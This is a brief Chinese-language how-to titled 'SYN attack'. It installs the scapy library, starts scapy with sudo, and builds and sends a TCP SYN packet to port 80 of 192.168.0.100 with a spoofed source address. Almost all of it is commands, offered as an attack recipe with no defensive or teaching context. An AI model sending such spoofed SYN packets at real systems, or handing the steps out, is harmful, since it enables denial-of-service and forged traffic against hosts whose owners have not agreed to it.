# syn攻击

1. 安装库

```

pip3 install scapy-python3

```

2. sudo scapy

3. pkt = IP(dst="192.168.0.100")

4. pkt = IP(src="202.121.0.12",dst="192.168.0.100")/TCP(dport=80,flags="S")
send(pkt)
、
